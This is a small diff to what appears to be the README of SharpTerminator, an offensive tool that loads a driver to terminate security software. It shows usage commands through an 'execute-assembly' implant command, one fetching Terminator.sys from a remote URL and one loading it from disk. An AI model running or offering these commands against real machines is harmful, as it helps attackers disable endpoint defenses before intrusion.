@@ -16,7 +16,7 @@ execute-assembly SharpTerminator.exe --url "http://remoteurl.com:80/Terminator.s
 ```
 Loading from disk:
 ```
-SharpTerminator.exe --disk "C:\path\to\driver\Terminator.sys"
+execute-assembly SharpTerminator.exe --disk "C:\path\to\driver\Terminator.sys"
 ```
 
 
